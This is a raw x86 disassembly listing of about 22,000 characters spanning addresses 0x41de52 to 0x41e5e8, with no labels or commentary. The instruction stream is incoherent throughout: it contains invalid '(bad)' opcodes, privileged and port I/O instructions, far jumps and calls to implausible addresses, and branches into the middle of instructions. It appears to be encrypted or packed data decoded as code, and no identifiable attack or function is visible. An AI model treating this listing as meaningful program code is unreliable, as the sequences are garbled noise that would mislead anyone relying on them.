  41de52:	js     0x41deaa
  41de54:	mov    ebx,0xd144abc2
  41de59:	ud2    
  41de5b:	and    bh,dl
  41de5d:	fild   DWORD PTR [eax+0x20f48ed0]
  41de63:	xchg   esi,eax
  41de64:	out    0xd3,al
  41de66:	push   es
  41de67:	lods   al,BYTE PTR ds:[esi]
  41de68:	nop    DWORD PTR [edx]
  41de6b:	mov    dl,0xd
  41de6d:	sub    bh,BYTE PTR [di]
  41de70:	push   ebx
  41de71:	jp     0x41ddfe
  41de73:	pushf  
  41de74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de75:	nop
  41de76:	imul   edx,edi,0x18
  41de79:	adc    edi,DWORD PTR [ecx-0x78841e24]
  41de7f:	aas    
  41de80:	xchg   ebp,eax
  41de81:	lods   eax,DWORD PTR ds:[esi]
  41de82:	sbb    al,0xe8
  41de84:	fcom   QWORD PTR [edi-0x36]
  41de87:	jae    0x41de0a
  41de89:	inc    esp
  41de8a:	push   esp
  41de8b:	sti    
  41de8c:	mov    WORD PTR [edi+0xc5caffc],es
  41de92:	data16 sbb dl,0xca
  41de96:	jge    0x41de46
  41de98:	pop    ebp
  41de99:	clc    
  41de9a:	(bad)  
  41de9b:	jo     0x41dee1
  41de9d:	scas   al,BYTE PTR es:[edi]
  41de9e:	xor    DWORD PTR [eax-0x3e],ebp
  41dea1:	das    
  41dea2:	fwait
  41dea3:	cdq    
  41dea4:	mov    al,ds:0xe3fbf94
  41dea9:	jge    0x41df05
  41deab:	addr16 jle 0x41def0
  41deae:	pop    ebx
  41deaf:	mov    ds:0xf6e2c114,al
  41deb4:	arpl   WORD PTR [ebx+0x42],cx
  41deb7:	ret    
  41deb8:	push   ebp
  41deb9:	sbb    DWORD PTR [edi],esi
  41debb:	push   esp
  41debc:	shr    BYTE PTR [ecx+0x6c7ea041],cl
  41dec2:	je     0x41de4d
  41dec4:	push   ecx
  41dec5:	mov    esi,ebp
  41dec7:	xor    edi,esi
  41dec9:	into   
  41deca:	push   0xffffff92
  41decc:	lea    ebx,[ecx-0x2b]
  41decf:	ror    dh,1
  41ded1:	adc    al,0x5e
  41ded3:	or     al,0x86
  41ded5:	sbb    bl,BYTE PTR [ebp+0x3ef594ea]
  41dedb:	mov    BYTE PTR [ecx+0x19],al
  41dede:	pop    ecx
  41dedf:	(bad)  
  41dee0:	pop    esp
  41dee1:	pop    eax
  41dee2:	cs mov eax,0xbdb514d2
  41dee8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dee9:	rcl    BYTE PTR [edi-0x27a953a2],1
  41deef:	stos   BYTE PTR es:[edi],al
  41def0:	xchg   esp,ebp
  41def2:	pusha  
  41def3:	mov    ebp,esi
  41def5:	jne    0x41df09
  41def7:	jl     0x41df07
  41def9:	call   0x9a12a951
  41defe:	std    
  41deff:	lock and DWORD PTR [ecx+0x3d],edx
  41df03:	push   ss
  41df04:	shl    DWORD PTR ds:0xf388c28b,cl
  41df0a:	das    
  41df0b:	push   eax
  41df0c:	rep stos DWORD PTR es:[edi],eax
  41df0e:	add    dl,cl
  41df10:	pop    es
  41df11:	inc    edx
  41df12:	adc    DWORD PTR [edi],edi
  41df14:	jle    0x41debd
  41df16:	test   al,0x31
  41df18:	cmp    DWORD PTR [edi],edi
  41df1a:	and    dl,cl
  41df1c:	lock jne 0x41df2b
  41df1f:	sbb    al,0x87
  41df21:	test   BYTE PTR [ecx],bh
  41df23:	stc    
  41df24:	fisubr WORD PTR [edi+ebx*2-0x520fcc9e]
  41df2b:	dec    ebp
  41df2c:	xor    edi,DWORD PTR [edi+0x39]
  41df2f:	loop   0x41df0f
  41df31:	pop    esi
  41df32:	mov    edi,0xbc66496a
  41df37:	test   al,0xea
  41df39:	cwde   
  41df3a:	dec    edx
  41df3b:	sub    ah,BYTE PTR [edi-0x24]
  41df3e:	sbb    DWORD PTR [esi-0x47],edi
  41df41:	sar    DWORD PTR [esi],cl
  41df43:	repz push edi
  41df45:	ret    0xc345
  41df48:	pop    edi
  41df49:	xchg   BYTE PTR [eax+0x8701e74],dl
  41df4f:	push   ebp
  41df50:	inc    ebx
  41df51:	icebp  
  41df52:	call   0x49c1:0xcb25f97a
  41df59:	dec    edi
  41df5a:	mov    edi,0x3586c808
  41df5f:	and    DWORD PTR [ebp+ecx*1+0x2200c106],0xffffff9b
  41df67:	aaa    
  41df68:	mov    edx,0xaef597f6
  41df6d:	gs aas 
  41df6f:	adc    eax,0xdeed085
  41df74:	iret   
  41df75:	fwait
  41df76:	data16 test al,0x35
  41df79:	ss pusha 
  41df7b:	push   cs
  41df7c:	xlat   BYTE PTR ds:[ebx]
  41df7d:	jle    0x41dfe0
  41df7f:	repnz dec eax
  41df81:	mov    ds:0xc8ee17a6,eax
  41df86:	xchg   BYTE PTR [ebx+0x6ed1e4e7],ah
  41df8c:	imul   edx,DWORD PTR [ebp+0x1c093ccc],0x7c2d1cf7
  41df96:	lds    edi,FWORD PTR [edi+0x3f]
  41df99:	or     al,0x66
  41df9b:	mov    esp,0xb64addf7
  41dfa0:	cld    
  41dfa1:	mov    ah,0x3c
  41dfa3:	sahf   
  41dfa4:	mov    ebp,0x19f6a11b
  41dfa9:	stc    
  41dfaa:	popa   
  41dfab:	pop    edi
  41dfac:	xchg   edi,eax
  41dfad:	dec    esi
  41dfae:	ja     0x41df9f
  41dfb0:	imul   ebp,DWORD PTR ds:[eax-0x6364838a],0x2d5ae310
  41dfbb:	mov    eax,ds:0xadfc3fcb
  41dfc0:	adc    BYTE PTR [ecx+0x17be01ec],cl
  41dfc6:	mov    ecx,0xeda7ab42
  41dfcb:	push   ss
  41dfcc:	retf   0x93dc
  41dfcf:	leave  
  41dfd0:	jmp    0xa5ec7ef7
  41dfd5:	imul   edi,DWORD PTR [eax],0xba1ed18c
  41dfdb:	shr    DWORD PTR [ebp-0x8],1
  41dfde:	sbb    ah,BYTE PTR [eax-0x6b146171]
  41dfe4:	int3   
  41dfe5:	add    eax,eax
  41dfe7:	or     eax,0x733a15e1
  41dfec:	and    eax,0x7265c4b9
  41dff1:	sub    dh,bl
  41dff3:	fcmovne st,st(7)
  41dff5:	jmp    FWORD PTR [edi]
  41dff7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dff8:	loope  0x41dfe3
  41dffa:	and    cl,BYTE PTR [ebp+0xa]
  41dffd:	xor    al,0x7c
  41dfff:	jg     0x41dfd1
  41e001:	mov    esp,0xc64cd8d8
  41e006:	xlat   BYTE PTR ds:[ebx]
  41e007:	stc    
  41e008:	iret   
  41e009:	xchg   ecx,eax
  41e00a:	nop
  41e00b:	mov    DWORD PTR [eax-0x485b7e99],ebx
  41e011:	dec    ebx
  41e012:	jns    0x41e021
  41e014:	jae    0x41dfed
  41e016:	in     eax,0x73
  41e018:	out    0x9,eax
  41e01a:	ror    DWORD PTR [esi],cl
  41e01c:	js     0x41e06b
  41e01e:	repnz lods al,BYTE PTR ds:[esi]
  41e020:	dec    esp
  41e021:	jmp    0xcd082134
  41e026:	daa    
  41e027:	pop    eax
  41e028:	sbb    eax,0xe030923d
  41e02d:	add    esi,DWORD PTR [eax]
  41e02f:	lds    esp,FWORD PTR [ebp-0xb]
  41e032:	jp     0x41e08b
  41e034:	gs ins DWORD PTR es:[edi],dx
  41e036:	push   0x8871b6ce
  41e03b:	lds    edx,FWORD PTR [eax+edi*4]
  41e03e:	popa   
  41e03f:	and    ah,ch
  41e041:	scas   eax,DWORD PTR es:[edi]
  41e042:	push   esi
  41e043:	sbb    DWORD PTR [eax+0x73af91a8],edi
  41e049:	or     DWORD PTR [ecx+0x31fd7a14],0xb8350faa
  41e053:	retf   
  41e054:	adc    al,0x86
  41e056:	inc    esp
  41e057:	adc    al,0xc5
  41e059:	lea    eax,[esi-0x78b7fea1]
  41e05f:	fidivr DWORD PTR [edx+0x7498d161]
  41e065:	cmp    al,0x26
  41e067:	dec    edi
  41e068:	ffree  st(3)
  41e06a:	mov    DWORD PTR [edi+eiz*2-0x196061fb],ebx
  41e071:	mov    cl,0x6a
  41e073:	aam    0x88
  41e075:	test   eax,0xe411ba21
  41e07a:	(bad)  
  41e07b:	mov    eax,ds:0xec352909
  41e080:	push   0x1b
  41e082:	sti    
  41e083:	mov    cl,0xaa
  41e085:	loopne 0x41e106
  41e087:	fistp  WORD PTR [eax+0x190e71f2]
  41e08d:	ja     0x41e069
  41e08f:	dec    esi
  41e090:	test   DWORD PTR [edi+edi*8+0x2a],esi
  41e094:	dec    esp
  41e095:	fucomip st,st(6)
  41e097:	lock ss sahf 
  41e09a:	jmp    0x41e07c
  41e09c:	jb     0x41e04b
  41e09e:	mov    ch,0x97
  41e0a0:	pop    ebx
  41e0a1:	int    0x5f
  41e0a3:	jmp    0xcba8:0xb0913afb
  41e0aa:	or     DWORD PTR [edx+edi*2+0x12e3188],esi
  41e0b1:	rcr    ebx,0x43
  41e0b4:	push   edi
  41e0b5:	cmp    dl,BYTE PTR [edi+esi*2-0x679e6528]
  41e0bc:	cdq    
  41e0bd:	stc    
  41e0be:	dec    ebx
  41e0bf:	sub    al,0xa9
  41e0c1:	pop    esp
  41e0c2:	pop    edi
  41e0c3:	push   ebx
  41e0c4:	test   al,0x8e
  41e0c6:	div    BYTE PTR [edi-0xcc17702]
  41e0cc:	std    
  41e0cd:	(bad)  
  41e0cf:	enter  0x5d09,0x74
  41e0d3:	xor    al,0x7b
  41e0d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e0d6:	jbe    0x41e06d
  41e0d8:	pop    ecx
  41e0d9:	cld    
  41e0da:	adc    BYTE PTR [edi],al
  41e0dc:	out    dx,al
  41e0dd:	dec    ebp
  41e0de:	adc    DWORD PTR [ebp+0x40528a6f],0x5e
  41e0e5:	push   ebx
  41e0e6:	fidiv  DWORD PTR [edx]
  41e0e8:	sbb    al,0xf4
  41e0ea:	mov    al,0xdf
  41e0ec:	mov    bh,0x46
  41e0ee:	cli    
  41e0ef:	clc    
  41e0f0:	mov    ebp,0x7ac1d780
  41e0f5:	pop    ebx
  41e0f6:	jl     0x41e12d
  41e0f8:	sub    al,0x96
  41e0fa:	enter  0xc7bc,0xbc
  41e0fe:	inc    ebx
  41e0ff:	dec    edi
  41e100:	ror    DWORD PTR [eax],1
  41e102:	cwde   
  41e103:	dec    DWORD PTR [ecx+0x68569070]
  41e109:	pop    ecx
  41e10a:	sti    
  41e10b:	mov    bl,0xcc
  41e10d:	les    edi,FWORD PTR [ebx+0x6cfbfbbf]
  41e113:	loopne 0x41e116
  41e115:	iret   
  41e116:	rol    bh,cl
  41e118:	mov    bl,0x4b
  41e11a:	imul   esi
  41e11c:	pop    ebp
  41e11d:	or     al,0x86
  41e11f:	xchg   ebp,eax
  41e120:	sub    BYTE PTR [edi],bh
  41e122:	stos   DWORD PTR es:[edi],eax
  41e123:	push   0xf96e2a8b
  41e128:	push   esi
  41e129:	sub    BYTE PTR [edx],al
  41e12b:	sub    eax,ebx
  41e12d:	mov    esi,0x8ccb4048
  41e132:	inc    edi
  41e133:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e134:	fwait
  41e135:	jo     0x41e0d2
  41e137:	adc    eax,0x619f8b40
  41e13c:	mov    ebx,0x83a12849
  41e141:	add    eax,0x9b9c3894
  41e146:	cli    
  41e147:	aam    0x34
  41e149:	outs   dx,BYTE PTR ds:[esi]
  41e14a:	sbb    BYTE PTR ds:0xf747751b,0x8a
  41e151:	bound  eax,QWORD PTR [edi+edx*2+0x3c159417]
  41e158:	loopne 0x41e14f
  41e15a:	push   esi
  41e15b:	cs and eax,0x704590c
  41e161:	mov    edx,0x3ea59716
  41e166:	mov    ch,0x90
  41e168:	xchg   BYTE PTR [ebx+0x6ff98780],ah
  41e16e:	loop   0x41e13d
  41e170:	cdq    
  41e171:	icebp  
  41e172:	jns    0x41e1b7
  41e174:	xchg   ebp,eax
  41e175:	mov    dl,0xc7
  41e177:	ins    DWORD PTR es:[edi],dx
  41e178:	mov    ch,0x63
  41e17a:	push   ebp
  41e17b:	cdq    
  41e17c:	(bad)  
  41e17d:	sbb    bl,BYTE PTR [esi]
  41e17f:	aad    0x77
  41e181:	jg     0x41e18d
  41e183:	pop    ebp
  41e184:	pop    edx
  41e185:	mov    bl,0xf2
  41e187:	xchg   edx,eax
  41e188:	sbb    ebp,DWORD PTR [edi+0x48]
  41e18b:	xor    DWORD PTR [ecx+0x4b4352ef],edx
  41e191:	xchg   ecx,eax
  41e192:	in     al,dx
  41e193:	push   0x69
  41e195:	dec    edx
  41e196:	adc    ecx,DWORD PTR [esi-0x75]
  41e199:	into   
  41e19a:	sub    BYTE PTR [ecx-0x56350469],ah
  41e1a0:	cmp    DWORD PTR [edi+0x5b395e0],ebx
  41e1a6:	xchg   esp,eax
  41e1a7:	shr    DWORD PTR ss:[esi],1
  41e1aa:	push   esi
  41e1ab:	push   edx
  41e1ac:	mov    dl,0x9c
  41e1ae:	pop    ebx
  41e1af:	mov    dl,BYTE PTR [esi+0x7af59ad8]
  41e1b5:	ss mov bl,bh
  41e1b8:	or     al,BYTE PTR [ecx]
  41e1ba:	out    0x62,eax
  41e1bc:	std    
  41e1bd:	push   ecx
  41e1be:	clc    
  41e1bf:	mov    eax,ds:0x2b68c008
  41e1c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e1c5:	xor    ebp,DWORD PTR [ebx-0x2f]
  41e1c8:	mov    edx,0xa9511d7e
  41e1cd:	aas    
  41e1ce:	xchg   ebp,eax
  41e1cf:	mov    cl,0x36
  41e1d1:	dec    eax
  41e1d2:	adc    dh,0x2
  41e1d5:	inc    BYTE PTR [ebx-0x4c]
  41e1d8:	(bad)  
  41e1da:	push   ecx
  41e1db:	or     bh,0xba
  41e1de:	add    eax,0x634e8f77
  41e1e3:	dec    BYTE PTR [ebx+0x3ccf7ad7]
  41e1e9:	popa   
  41e1ea:	fs xchg edx,eax
  41e1ec:	or     DWORD PTR [eax],esi
  41e1ee:	test   al,0x50
  41e1f0:	bnd ja 0x41e1ce
  41e1f3:	mov    bh,0x8b
  41e1f5:	(bad)  
  41e1f6:	je     0x41e17e
  41e1f8:	in     eax,0x62
  41e1fa:	out    0xa8,al
  41e1fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e1fd:	in     eax,0x73
  41e1ff:	fistp  DWORD PTR [edx]
  41e201:	add    edx,edi
  41e203:	cmp    ebp,DWORD PTR [ebx+0x2edddd3e]
  41e209:	push   ebx
  41e20a:	sbb    DWORD PTR [edx],ecx
  41e20c:	test   DWORD PTR [ecx-0x1d],esi
  41e20f:	dec    edx
  41e210:	test   DWORD PTR ds:0x6bcd2f59,0x90dda119
  41e21a:	lods   eax,DWORD PTR ds:[esi]
  41e21b:	sbb    DWORD PTR [eax+edx*8-0x37],0xfab4a97c
  41e223:	clc    
  41e224:	sbb    ah,BYTE PTR [ecx]
  41e226:	pop    esi
  41e227:	mov    eax,edx
  41e229:	xor    eax,0x527f8602
  41e22e:	and    dh,BYTE PTR [esi+eiz*1]
  41e231:	mov    eax,0x4b302fa2
  41e236:	iret   
  41e237:	add    edx,0xffffffd4
  41e23a:	jmp    0x4ef60042
  41e23f:	loopne 0x41e210
  41e241:	das    
  41e242:	dec    edi
  41e243:	ja     0x41e2c1
  41e245:	push   0x61
  41e247:	jg     0x41e1ef
  41e249:	sub    dl,al
  41e24b:	push   edi
  41e24c:	bnd jbe 0x41e227
  41e24f:	rol    ch,0x22
  41e252:	adc    dh,BYTE PTR [eax+0x45]
  41e255:	dec    ecx
  41e256:	in     ax,0x74
  41e259:	pop    ebp
  41e25a:	push   0xcb2737a2
  41e25f:	dec    ebp
  41e260:	dec    edx
  41e261:	inc    eax
  41e262:	ja     0x41e201
  41e264:	dec    edx
  41e265:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e266:	cdq    
  41e267:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e268:	aaa    
  41e269:	stos   BYTE PTR es:[edi],al
  41e26a:	not    DWORD PTR [eax]
  41e26c:	(bad)  
  41e26d:	out    0x66,al
  41e26f:	adc    BYTE PTR [edi],bl
  41e271:	dec    esi
  41e272:	jmp    0x74f6:0x8c3b0d1a
  41e279:	lods   al,BYTE PTR ds:[esi]
  41e27a:	pop    ebx
  41e27b:	jo     0x41e2a3
  41e27d:	inc    ebx
  41e27e:	mov    ah,0xde
  41e280:	mov    edx,0xd1653b2e
  41e285:	icebp  
  41e286:	or     bh,dh
  41e288:	aas    
  41e289:	dec    eax
  41e28a:	mov    ds:0xefebd5c4,eax
  41e28f:	arpl   di,di
  41e291:	xchg   esp,eax
  41e292:	mov    esp,esp
  41e294:	sub    DWORD PTR [edi+0x1026ad9b],ebx
  41e29a:	push   ss
  41e29b:	and    al,0x34
  41e29d:	sbb    eax,0x86b3c402
  41e2a2:	mov    eax,0x399c1f90
  41e2a7:	lods   eax,DWORD PTR ds:[esi]
  41e2a8:	push   0xffffffb5
  41e2aa:	scas   al,BYTE PTR es:[edi]
  41e2ab:	adc    eax,0xe73ac095
  41e2b0:	mov    eax,ds:0xb8aa84a8
  41e2b5:	stos   BYTE PTR es:[edi],al
  41e2b6:	mov    cl,0xe8
  41e2b8:	sub    esi,0xffffffc9
  41e2bb:	rcr    DWORD PTR [ecx+ecx*1-0x30da6a7b],0xb6
  41e2c3:	push   ecx
  41e2c4:	or     BYTE PTR [esi+esi*8],0x83
  41e2c8:	sbb    al,0x32
  41e2ca:	fwait
  41e2cb:	sub    ebx,edx
  41e2cd:	jp     0x41e2ea
  41e2cf:	mov    ebx,0xd8273630
  41e2d4:	push   ebx
  41e2d5:	fist   WORD PTR ds:0x1858f7f1
  41e2db:	daa    
  41e2dc:	loope  0x41e2ef
  41e2de:	scas   al,BYTE PTR es:[edi]
  41e2df:	mov    edx,0xf9a6b288
  41e2e4:	jne    0x41e330
  41e2e6:	add    al,0x7
  41e2e8:	in     al,dx
  41e2e9:	hlt    
  41e2ea:	mov    BYTE PTR [edx+ebx*1],0xf4
  41e2ee:	push   ebp
  41e2ef:	mov    edx,0x6209dbc2
  41e2f4:	stc    
  41e2f5:	dec    ecx
  41e2f6:	add    eax,0x6e986790
  41e2fb:	push   0xfffffff8
  41e2fd:	loopne 0x41e2e7
  41e2ff:	and    ecx,eax
  41e301:	or     al,0xa8
  41e303:	pop    ss
  41e304:	js     0x41e28e
  41e306:	ret    
  41e307:	jmp    0x41e2a9
  41e309:	aas    
  41e30a:	(bad)  [eax]
  41e30c:	mov    dl,0x5e
  41e30e:	out    dx,eax
  41e30f:	and    al,0xbb
  41e311:	lock mov DWORD PTR [esp+ebx*2-0x75],edx
  41e316:	call   0x5a2da7ed
  41e31b:	test   al,0x8c
  41e31d:	jmp    0x8c7c:0xf98a6ca5
  41e324:	push   edx
  41e325:	dec    ebp
  41e326:	popf   
  41e327:	lock ins BYTE PTR es:[edi],dx
  41e329:	pop    edi
  41e32a:	clc    
  41e32b:	push   esp
  41e32c:	popa   
  41e32d:	xlat   BYTE PTR ds:[ebx]
  41e32e:	jmp    0x41e2b4
  41e330:	call   0xaf1c:0xbd5f2cd7
  41e337:	jne    0x41e391
  41e339:	test   BYTE PTR [edi+0x24],bl
  41e33c:	push   esp
  41e33d:	call   0xd2f093d5
  41e342:	push   esp
  41e343:	dec    edi
  41e344:	push   esi
  41e345:	pop    edi
  41e346:	pop    esi
  41e347:	mov    ecx,0x711b4a32
  41e34c:	hlt    
  41e34d:	out    dx,eax
  41e34e:	push   es
  41e34f:	imul   esp,DWORD PTR ds:0xc48b8195,0xffffffcb
  41e356:	lds    edi,FWORD PTR [ebx+0x62]
  41e359:	dec    ebp
  41e35a:	jne    0x41e3c8
  41e35c:	push   eax
  41e35d:	lods   al,BYTE PTR ds:[esi]
  41e35e:	int3   
  41e35f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e360:	push   ebp
  41e361:	scas   eax,DWORD PTR es:[edi]
  41e362:	cmp    bl,BYTE PTR [esi]
  41e364:	sar    BYTE PTR [edi+0x455bf686],cl
  41e36a:	test   DWORD PTR [ebp+esi*4+0x453ee513],esi
  41e371:	dec    edx
  41e372:	repz cwde 
  41e374:	popa   
  41e375:	and    al,0xe8
  41e377:	inc    eax
  41e378:	stos   DWORD PTR es:[edi],eax
  41e379:	jns    0x41e377
  41e37b:	leave  
  41e37c:	push   eax
  41e37d:	lahf   
  41e37e:	mov    ch,0x7b
  41e380:	fst    QWORD PTR [eax]
  41e382:	imul   ebp,DWORD PTR [edi],0xcfde366d
  41e388:	stos   DWORD PTR es:[edi],eax
  41e389:	rol    BYTE PTR [esi],cl
  41e38b:	sub    edx,DWORD PTR [edi]
  41e38d:	fucomp st(2)
  41e38f:	neg    DWORD PTR [eax+0x1ed5a52]
  41e395:	out    0x8b,eax
  41e397:	mov    esi,0xb4e7ca1
  41e39c:	sub    al,BYTE PTR [ecx]
  41e39e:	or     esp,eax
  41e3a0:	push   esi
  41e3a1:	ds jns 0x41e386
  41e3a4:	and    al,0xce
  41e3a6:	mov    ah,0x82
  41e3a8:	stc    
  41e3a9:	cmc    
  41e3aa:	outs   dx,BYTE PTR ds:[esi]
  41e3ab:	or     dl,ah
  41e3ad:	jo     0x41e330
  41e3af:	das    
  41e3b0:	xor    eax,0x2fcbc59b
  41e3b5:	loop   0x41e419
  41e3b7:	pop    eax
  41e3b8:	or     al,0x4a
  41e3ba:	inc    ebx
  41e3bb:	adc    al,0x41
  41e3bd:	adc    DWORD PTR [ecx+0x517a8462],ecx
  41e3c3:	mov    al,BYTE PTR [ebx+0x26ef831e]
  41e3c9:	or     DWORD PTR [edi-0x6f],edx
  41e3cc:	cmp    bh,BYTE PTR [ecx]
  41e3ce:	mov    bl,0xff
  41e3d0:	inc    esi
  41e3d1:	or     eax,0x8609f052
  41e3d6:	dec    BYTE PTR [ecx-0x686848d4]
  41e3dc:	inc    ecx
  41e3dd:	test   BYTE PTR [eax+edx*8-0x558121e5],dh
  41e3e4:	loop   0x41e36b
  41e3e6:	data16 lahf 
  41e3e8:	push   ss
  41e3e9:	sub    BYTE PTR [ebx+0x72],bh
  41e3ec:	leave  
  41e3ed:	jmp    0x41e413
  41e3ef:	loope  0x41e396
  41e3f1:	jae    0x41e407
  41e3f3:	std    
  41e3f4:	cmp    edx,DWORD PTR [edx+0x1dfc0976]
  41e3fa:	push   edx
  41e3fb:	das    
  41e3fc:	repz pop ss
  41e3fe:	rcr    DWORD PTR [ebx+0x6d],0xb7
  41e402:	push   ebp
  41e403:	pop    ds
  41e404:	ss sar esp,cl
  41e407:	test   eax,0x3738d6f6
  41e40c:	push   edx
  41e40d:	mov    edi,0x9a72d297
  41e412:	xchg   BYTE PTR [ebx+0x64d19801],ch
  41e418:	clc    
  41e419:	cmp    al,0xd0
  41e41b:	xchg   edi,eax
  41e41c:	xor    al,BYTE PTR [ecx+0x3a]
  41e41f:	int3   
  41e420:	add    BYTE PTR [esi],0x43
  41e423:	sub    dh,dh
  41e425:	sub    DWORD PTR [esi+0x3e416d7b],edi
  41e42b:	xchg   ebx,eax
  41e42c:	push   ecx
  41e42d:	dec    eax
  41e42e:	push   cs
  41e42f:	clc    
  41e430:	inc    edi
  41e431:	in     al,0xd2
  41e433:	add    BYTE PTR [eax],cl
  41e435:	sbb    eax,0x7c27bad5
  41e43a:	cmp    DWORD PTR [eax],ecx
  41e43c:	mov    ebx,0x6e5e4e4b
  41e441:	nop
  41e442:	xchg   esi,eax
  41e443:	adc    esi,0xfffffff4
  41e446:	mov    ebp,DWORD PTR [edx-0x2bee76]
  41e44c:	xor    eax,0x83d748df
  41e451:	fs aas 
  41e453:	enter  0x8cba,0xb4
  41e457:	call   0x244c:0xf9071ab7
  41e45e:	arpl   si,si
  41e460:	xor    bl,dl
  41e462:	add    esi,DWORD PTR [eax]
  41e464:	leave  
  41e465:	jge    0x41e41c
  41e467:	mov    ch,0x2b
  41e469:	dec    ebp
  41e46a:	gs xchg cl,cl
  41e46d:	mov    al,0x2
  41e46f:	pop    ebx
  41e470:	sub    al,dl
  41e472:	sbb    al,0x35
  41e474:	cld    
  41e475:	sub    DWORD PTR [ecx-0x3b],0x9862d4ac
  41e47c:	inc    edx
  41e47d:	out    0x84,al
  41e47f:	cmp    BYTE PTR [edi-0x57],dh
  41e482:	fcomp  QWORD PTR ds:0x9467dbb8
  41e488:	sub    DWORD PTR [edx],eax
  41e48a:	adc    DWORD PTR [esi],edx
  41e48c:	rol    DWORD PTR [edx],1
  41e48e:	xchg   ecx,eax
  41e48f:	cmp    ecx,DWORD PTR [ebx]
  41e491:	or     ch,bh
  41e493:	inc    edx
  41e494:	call   0xa7d78450
  41e499:	mov    eax,0x8c83e9a5
  41e49e:	rol    BYTE PTR [esi],0xf6
  41e4a1:	mov    ah,0xad
  41e4a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e4a4:	jle    0x41e4a6
  41e4a6:	sbb    eax,0xe21c1d19
  41e4ab:	sub    ebx,edx
  41e4ad:	dec    ebp
  41e4ae:	adc    eax,0xbeafb660
  41e4b3:	mov    ds:0xfa50474d,eax
  41e4b8:	xchg   edi,eax
  41e4b9:	sbb    DWORD PTR [ebp-0x37],esp
  41e4bc:	fsubp  st(7),st
  41e4be:	inc    esi
  41e4bf:	adc    edx,DWORD PTR [edi]
  41e4c1:	punpckhdq mm1,QWORD PTR [edi+0xabd0ce1]
  41e4c8:	inc    ebp
  41e4c9:	hlt    
  41e4ca:	sbb    al,BYTE PTR ds:0x8974d69
  41e4d0:	xchg   BYTE PTR [ebx],ch
  41e4d2:	sbb    DWORD PTR ds:0x39b284a,edx
  41e4d8:	and    eax,0xde9116fe
  41e4dd:	dec    esp
  41e4de:	pop    es
  41e4df:	call   0x90c:0x8a6d9be1
  41e4e6:	adc    ah,ah
  41e4e8:	aaa    
  41e4e9:	cmp    BYTE PTR [eax],bl
  41e4eb:	push   edi
  41e4ec:	jle    0x41e481
  41e4ee:	fild   WORD PTR [eax-0x56]
  41e4f1:	test   dh,bl
  41e4f3:	cmp    al,0xb
  41e4f5:	inc    edi
  41e4f6:	mov    al,ds:0xc47ce199
  41e4fb:	in     eax,dx
  41e4fc:	dec    ecx
  41e4fd:	sbb    eax,0x71240893
  41e502:	gs mov ebp,0xc4eb017a
  41e508:	mov    ecx,0xa0ba9a8e
  41e50d:	cwde   
  41e50e:	aad    0x4d
  41e510:	or     ebx,DWORD PTR [ecx]
  41e512:	fwait
  41e513:	and    al,0xf0
  41e515:	sbb    ebp,DWORD PTR [edx+0x1363dab7]
  41e51b:	add    ch,BYTE PTR [ecx-0x72]
  41e51e:	inc    ebp
  41e51f:	leave  
  41e520:	arpl   WORD PTR [ecx-0x25fd6d1a],ax
  41e526:	ss je  0x41e535
  41e529:	inc    edi
  41e52a:	loope  0x41e567
  41e52c:	test   DWORD PTR [edx],0xe1b81be8
  41e532:	mov    ds:0x3ecae8ed,eax
  41e537:	mov    ds:0x42bf9277,al
  41e53c:	je     0x41e535
  41e53e:	xchg   BYTE PTR [eax-0x2c4fb8ad],cl
  41e544:	lahf   
  41e545:	push   ss
  41e546:	adc    al,0x6a
  41e548:	sub    ebx,DWORD PTR [edx+ebp*1-0x49]
  41e54c:	sbb    BYTE PTR [edi+0x1b],dh
  41e54f:	cmp    ah,BYTE PTR [edx-0x59]
  41e552:	inc    eax
  41e553:	push   es
  41e554:	cli    
  41e555:	xor    DWORD PTR [ecx-0x6a79c4c],edx
  41e55b:	in     eax,dx
  41e55c:	mov    eax,0x23b0de65
  41e561:	pop    esi
  41e562:	ret    
  41e563:	jmp    0x41e53f
  41e565:	xchg   BYTE PTR ds:0x819e525d,bl
  41e56b:	pop    esp
  41e56c:	push   ebx
  41e56d:	in     eax,dx
  41e56e:	sbb    al,BYTE PTR [ebx]
  41e570:	gs int 0x23
  41e573:	das    
  41e574:	xchg   ebx,eax
  41e575:	add    esp,ebx
  41e577:	sub    BYTE PTR [ecx+0x3014dcbe],al
  41e57d:	pop    ds
  41e57e:	sub    DWORD PTR [esp+esi*4+0x7b3f32bf],0xf
  41e586:	add    eax,0x6909804b
  41e58b:	popa   
  41e58c:	out    0xd2,al
  41e58e:	jnp    0x41e518
  41e590:	pop    edi
  41e591:	adc    dh,dh
  41e593:	add    BYTE PTR [esi-0xc],al
  41e596:	popf   
  41e597:	ins    BYTE PTR es:[edi],dx
  41e598:	aam    0x71
  41e59a:	pushf  
  41e59b:	imul   ecx,DWORD PTR [ecx+0x5a8e3329],0x663c06e0
  41e5a5:	sar    BYTE PTR [ecx-0x34],cl
  41e5a8:	xchg   esi,eax
  41e5a9:	aaa    
  41e5aa:	fnsave [ecx+0x4683136e]
  41e5b0:	mov    esp,DWORD PTR [ebp-0x66]
  41e5b3:	and    eax,0x558c1efb
  41e5b8:	lds    edx,FWORD PTR [ebp-0x66c9a0d9]
  41e5be:	push   ebp
  41e5bf:	loopne 0x41e5a0
  41e5c1:	int    0xe6
  41e5c3:	inc    ebx
  41e5c4:	pusha  
  41e5c5:	add    eax,0x88d744cf
  41e5ca:	sub    BYTE PTR [ebx+eiz*4+0x66],dh
  41e5ce:	(bad)  
  41e5cf:	jg     0x41e57b
  41e5d1:	push   es
  41e5d2:	div    esp
  41e5d4:	rcl    edx,cl
  41e5d6:	adc    cl,BYTE PTR [ecx+eiz*8+0x14abe438]
  41e5dd:	adc    edi,DWORD PTR [esi]
  41e5df:	inc    esp
  41e5e0:	dec    ebp
  41e5e1:	sbb    DWORD PTR [ecx+0x5b],eax
  41e5e4:	repnz cmc 
  41e5e6:	jmp    0x41e59f
  41e5e8:	inc    ebx
